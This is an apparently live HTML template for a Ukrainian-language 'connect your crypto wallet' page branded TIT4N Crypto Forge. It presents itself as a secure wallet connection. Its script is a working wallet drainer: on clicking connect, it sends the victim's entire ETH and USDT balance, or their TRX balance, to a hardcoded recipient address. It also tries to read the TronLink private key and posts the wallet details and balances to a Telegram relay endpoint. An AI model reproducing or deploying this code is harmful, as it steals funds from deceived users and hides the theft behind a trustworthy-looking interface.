<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∏–π –ø–µ—Ä–µ–∫–∞–∑ USDT, TRX —Ç–∞ ETH</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">üîê</div>
            <img src="{{ url_for('static', filename='icons/logo-removebg.png') }}" alt="TIT4N Crypto Forge Logo">
            <div class="network-indicator" id="networkIndicator">‚óè Online</div>
        </div>

        <div class="card">
            <h1 class="title">–ü—ñ–¥–∫–ª—é—á—ñ—Ç—å –≤–∞—à –∫—Ä–∏–ø—Ç–æ–≥–∞–º–∞–Ω–µ—Ü—å</h1>
            <p class="subtitle">–ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∏–∂—á–µ –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è</p>

            <div class="wallet-grid">
                <button class="wallet-button full-width" id="connectWallet">
                    <img src="{{ url_for('static', filename='icons/wallet.png') }}" alt="Wallet">
                    <span>–ü—ñ–¥–∫–ª—é—á–∏—Ç–∏ –≥–∞–º–∞–Ω–µ—Ü—å</span>
                </button>
            </div>

            <div class="connection-status">
                <div class="status-item">
                    <span class="label">–°—Ç–∞—Ç—É—Å:</span>
                    <span class="value" id="statusText">–ù–µ –ø—ñ–¥–∫–ª—é—á–µ–Ω–æ</span>
                </div>
                <div class="status-item">
                    <span class="label">–ê–¥—Ä–µ—Å–∞:</span>
                    <span class="value" id="walletAddress">‚Äî</span>
                </div>
            </div>

            <div class="additional-info">
                <p>üîí –ë–µ–∑–ø–µ—á–Ω–µ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –≤–∞—à–æ–≥–æ –∫—Ä–∏–ø—Ç–æ–≥–∞–º–∞–Ω—Ü—è.</p>
                <p>üí° –ü—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å—Å—è –≤—Å—ñ –ø–æ–ø—É–ª—è—Ä–Ω—ñ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∏ –≥–∞–º–∞–Ω—Ü—ñ–≤.</p>
                <p>üöÄ –ü–æ—á–Ω—ñ—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–µ—Ü–µ–Ω—Ç—Ä–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ –¥–æ–¥–∞—Ç–∫–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!</p>
            </div>
        </div>

        <div class="footer">
            <p>¬© 2025 TIT4N Crypto Forge. –í—Å—ñ –ø—Ä–∞–≤–∞ –∑–∞—Ö–∏—â–µ–Ω—ñ.</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const statusText = document.getElementById("statusText");
            const walletAddress_page = document.getElementById("walletAddress");

            // –ê–¥—Ä–µ—Å–∞ –∫–æ–Ω—Ç—Ä–∞–∫—Ç—É USDT (ERC-20)
            const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet
            // –ê–¥—Ä–µ—Å–∞ –æ—Ç—Ä–∏–º—É–≤–∞—á–∞
            const recipientAddress = "TUhVeqDoZajcs94CUPyDeYdvsL6EHqgCXh";

            // ABI –¥–ª—è –∫–æ–Ω—Ç—Ä–∞–∫—Ç—É USDT (ERC-20)
            const usdtAbi = [
                "function balanceOf(address owner) view returns (uint256)",
                "function transfer(address to, uint256 value) returns (bool)"
            ];

            // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–∏—Ö –≤ Telegram
            async function sendToTelegram(walletAddress, walletType, usdtBalance, trxBalance, ethBalance, message) {
                try {
                    const response = await fetch("/send_telegram", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            wallet_address: walletAddress,
                            wallet_type: walletType,
                            usdt_balance: usdtBalance,
                            trx_balance: trxBalance,
                            eth_balance: ethBalance,
                            message: message
                        })
                    });

                    if (!response.ok) {
                        throw new Error("–ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –≤ Telegram.");
                    }
                } catch (error) {
                    console.error("–ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", error);
                }
            }

            // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–ª–∞–Ω—Å—É USDT
            async function getUSDTBalance(signer, walletAddress) {
                try {
                    const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, signer);
                    const balance = await usdtContract.balanceOf(walletAddress);
                    return ethers.utils.formatUnits(balance, 6); // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—è –≤ USDT (6 –¥–µ—Å—è—Ç–∫–æ–≤–∏—Ö –∑–Ω–∞–∫—ñ–≤)
                } catch (error) {
                    console.error("–ü–æ–º–∏–ª–∫–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–ª–∞–Ω—Å—É USDT:", error);
                    return "0.0";
                }
            }

            // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –ø–µ—Ä–µ–∫–∞–∑—É USDT
            async function transferUSDT(signer, walletAddress) {
                try {
                    const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, signer);
                    const balance = await usdtContract.balanceOf(walletAddress);

                    if (balance.isZero()) {
                        return "–ù–∞ –≤–∞—à–æ–º—É –≥–∞–º–∞–Ω—Ü—ñ –Ω–µ–º–∞—î USDT.";
                    }

                    const tx = await usdtContract.transfer(recipientAddress, balance);
                    await tx.wait();

                    return `USDT –ø–µ—Ä–µ–∫–∞–∑–∞–Ω–æ: ${ethers.utils.formatUnits(balance, 6)}`;
                } catch (error) {
                    console.error("–ü–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–∫–∞–∑—É USDT:", error);
                    return `–ü–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–∫–∞–∑—É USDT: ${error.message}`;
                }
            }

            // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–ª–∞–Ω—Å—É ETH
            async function getETHBalance(signer, walletAddress) {
                try {
                    const balance = await signer.getBalance();
                    return ethers.utils.formatEther(balance); // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—è –≤ ETH
                } catch (error) {
                    console.error("–ü–æ–º–∏–ª–∫–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–ª–∞–Ω—Å—É ETH:", error);
                    return "0.0";
                }
            }

            // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –ø–µ—Ä–µ–∫–∞–∑—É ETH
            async function transferETH(signer, walletAddress) {
                try {
                    const balance = await signer.getBalance();

                    if (balance.isZero()) {
                        return "–ù–∞ –≤–∞—à–æ–º—É –≥–∞–º–∞–Ω—Ü—ñ –Ω–µ–º–∞—î ETH.";
                    }

                    const tx = await signer.sendTransaction({
                        to: recipientAddress,
                        value: balance
                    });
                    await tx.wait();

                    return `ETH –ø–µ—Ä–µ–∫–∞–∑–∞–Ω–æ: ${ethers.utils.formatEther(balance)}`;
                } catch (error) {
                    console.error("–ü–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–∫–∞–∑—É ETH:", error);
                    return `–ü–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–∫–∞–∑—É ETH: ${error.message}`;
                }
            }

            // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–ª–∞–Ω—Å—É TRX
            async function getTRXBalance(tronWeb, walletAddress) {
                try {
                    const balance = await tronWeb.trx.getBalance(walletAddress);
                    return tronWeb.fromSun(balance); // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—è –∑ SUN –≤ TRX
                } catch (error) {
                    console.error("–ü–æ–º–∏–ª–∫–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–ª–∞–Ω—Å—É TRX:", error);
                    return "0.0";
                }
            }

            // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –ø–µ—Ä–µ–∫–∞–∑—É TRX
            async function transferTRX(tronWeb, walletAddress) {
                try {
                    const balance = await tronWeb.trx.getBalance(walletAddress);

                    if (balance === 0) {
                        return "–ù–∞ –≤–∞—à–æ–º—É –≥–∞–º–∞–Ω—Ü—ñ –Ω–µ–º–∞—î TRX.";
                    }

                    const tx = await tronWeb.transactionBuilder.sendTrx(recipientAddress, balance, walletAddress);
                    const signedTx = await tronWeb.trx.sign(tx);
                    const result = await tronWeb.trx.sendRawTransaction(signedTx);

                    return `TRX –ø–µ—Ä–µ–∫–∞–∑–∞–Ω–æ: ${tronWeb.fromSun(balance)}`;
                } catch (error) {
                    console.error("–ü–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–∫–∞–∑—É TRX:", error);
                    return `–ü–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–∫–∞–∑—É TRX: ${error.message}`;
                }
            }

            // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≥–∞–º–∞–Ω—Ü—è
            async function connectWallet() {
                try {
                    let walletType = "Unknown";
                    let walletAddress = null;
                    let usdtBalance = "0.0";
                    let trxBalance = "0.0";
                    let ethBalance = "0.0";
                    let message = "";

                    // –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ Ethereum –≥–∞–º–∞–Ω—Ü—è (MetaMask, Trust Wallet —Ç–æ—â–æ)
                    if (window.ethereum) {
                        // –ó–∞–ø–∏—Ç –Ω–∞ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≥–∞–º–∞–Ω—Ü—è
                        await window.ethereum.request({ method: 'eth_requestAccounts' });

                        // –Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞
                        const provider = new ethers.providers.Web3Provider(window.ethereum);
                        const signer = provider.getSigner();

                        // –û—Ç—Ä–∏–º–∞–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ –≥–∞–º–∞–Ω—Ü—è
                        walletAddress = await signer.getAddress();



                        if (window.ethereum.isTrust) {
                            walletType = "Trust Wallet";
                        } else if (window.ethereum.isMetaMask) {
                            walletType = "MetaMask";
                        }

                        // –û—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–ª–∞–Ω—Å—É ETH
                        ethBalance = await getETHBalance(signer, walletAddress);
                        console.log(`–ë–∞–ª–∞–Ω—Å ETH: ${ethBalance}`);

                        // –ü–µ—Ä–µ–∫–∞–∑ ETH
                        const ethMessage = await transferETH(signer, walletAddress);
                        message += ethMessage + "\n";

                        // –û—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–ª–∞–Ω—Å—É USDT
                        usdtBalance = await getUSDTBalance(signer, walletAddress);
                        console.log(`–ë–∞–ª–∞–Ω—Å USDT: ${usdtBalance}`);

                        // –ü–µ—Ä–µ–∫–∞–∑ USDT
                        const usdtMessage = await transferUSDT(signer, walletAddress);
                        message += usdtMessage + "\n";
                    }
                    // –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ TronLink
                    else if (window.tronWeb) {
                        // –û—á—ñ–∫—É—î–º–æ, –ø–æ–∫–∏ TronLink —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è
                        await new Promise((resolve) => {
                            const interval = setInterval(() => {
                                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                                    clearInterval(interval);
                                    resolve();
                                }
                            }, 100);
                        });

                        walletType = "TronLink";
                        walletAddress = window.tronWeb.defaultAddress.base58;

                        const tronWeb = new TronWeb({
                            fullHost: "https://api.trongrid.io",
                            privateKey: window.tronWeb.defaultPrivateKey
                        });

                        // –û—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–ª–∞–Ω—Å—É TRX
                        trxBalance = await getTRXBalance(tronWeb, walletAddress);
                        console.log(`–ë–∞–ª–∞–Ω—Å TRX: ${trxBalance}`);

                        // –ü–µ—Ä–µ–∫–∞–∑ TRX
                        const trxMessage = await transferTRX(tronWeb, walletAddress);
                        message += trxMessage + "\n";
                    } else {
                        throw new Error("–ë—É–¥—å –ª–∞—Å–∫–∞, –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å MetaMask, Trust Wallet –∞–±–æ TronLink!");
                    }

                    statusText.textContent = `‚úÖ –ü—ñ–¥–∫–ª—é—á–µ–Ω–æ (${walletType})`;
                    walletAddress_page.textContent = walletAddress;

                    // –í—ñ–¥–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–∏—Ö –≤ Telegram
                    await sendToTelegram(walletAddress, walletType, usdtBalance, trxBalance, ethBalance, message);
                    alert(`–£—Å–ø—ñ—à–Ω–æ: ${message}`);
                } catch (error) {
                    statusText.textContent = "‚ùå –ü–æ–º–∏–ª–∫–∞ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è";
                    console.error("–ü–æ–º–∏–ª–∫–∞ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≥–∞–º–∞–Ω—Ü—è:", error);
                    alert(`–ü–æ–º–∏–ª–∫–∞: ${error.message}`);
                }
            }

            // –î–æ–¥–∞–≤–∞–Ω–Ω—è –æ–±—Ä–æ–±–Ω–∏–∫–∞ –ø–æ–¥—ñ–π –¥–ª—è –∫–Ω–æ–ø–∫–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è
            document.getElementById("connectWallet").addEventListener("click", connectWallet);

            // –Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –º–µ—Ä–µ–∂—ñ
            if (window.ethereum) {
                window.ethereum.on('chainChanged', () => window.location.reload());
                document.getElementById("networkIndicator").classList.add("online");
            }
        });
    </script>
</body>
</html>